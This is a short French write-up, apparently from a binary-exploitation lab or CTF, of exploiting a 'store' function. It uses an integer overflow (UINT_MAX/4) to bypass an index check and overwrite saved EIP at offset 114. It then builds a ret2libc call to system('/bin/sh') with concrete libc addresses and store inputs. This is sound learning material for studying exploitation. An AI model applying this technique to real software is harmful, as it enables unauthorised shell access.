On voit qu'on peut lire et écrire sur la stack à peu près partout sauf dans les multiples de 3 et un nombre ou le bit de poid fort est égal à 183


on va utiliser UINT_MAX // 4 pour overflow et bruteforce pour obtenir l'EIP

   0x08048723 <+0>:	push   %ebp
   0x08048724 <+1>:	mov    %esp,%ebp
   0x08048726 <+3>:	push   %edi
   0x08048727 <+4>:	push   %esi
   0x08048728 <+5>:	push   %ebx
   0x08048729 <+6>:	and    $0xfffffff0,%esp
   0x0804872c <+9>:	sub    $0x1d0,%esp
   ...
   0x08048791 <+110>:	lea    0x24(%esp),%ebx
   ...
a partir de ces instructions on peut trouver l'offset vers EIP

464 : Taille totale de la pile allouée. (0x0804872c <+9>:	sub    $0x1d0,%es)
36 : L'offset où le buffer commence (0x08048791 <+110>:	lea    0x24(%esp),%ebx).
16 : Les 4 registres poussés sur la pile. (push %ebp, push %edi, push %esi, push %ebx)
12 : Les 12 octets enlevés à cause de l'alignement de la pile. (0x08048729 <+6>:	and    $0xfffffff0,%esp)
-
ce qui fait : 464 - 36 = 428 on a esp aligné a l'offset du buffer
puis 428 + 16 + 12 = 456 

456 / 4 = 114 ce qui nous donne l'offset de EIP
On va faire un ret 2 libc

find 0xf7e2c000,0xf7fd0000,"/bin/sh"
0xf7f897ec = 4160264172 /bin/sh
0xf7e6aed0 = 4159090384 system

0xffffffff // 4 + 114 = 1073741938 EIP

store
4160264172 # bin/sh
116
store
4159090384 # system
1073741938 # eip

On met sur 116 car 115 vide pour le return de system